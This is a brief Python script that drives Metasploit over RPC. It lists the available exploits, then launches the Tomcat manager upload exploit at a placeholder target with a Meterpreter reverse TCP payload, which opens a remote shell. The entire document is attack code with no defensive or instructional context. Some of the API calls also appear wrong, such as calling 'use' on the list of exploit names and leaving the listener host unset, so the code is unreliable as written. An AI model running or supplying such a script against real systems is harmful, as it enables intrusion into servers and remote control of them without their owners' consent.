from pymetasploit3.msfrpc import MsfRpcClient

# Connect to Metasploit RPC server
client = MsfRpcClient('your_metasploit_ip', port=55553)

# List available exploits
exploits = client.modules.exploits
for exploit in exploits:
    print("[+] Exploit: " + exploit)

# Run an exploit
exploit = exploits.use('exploit/multi/http/tomcat_mgr_upload')
exploit['RHOSTS'] = 'target_ip'
exploit.execute(payload='payload/meterpreter/reverse_tcp')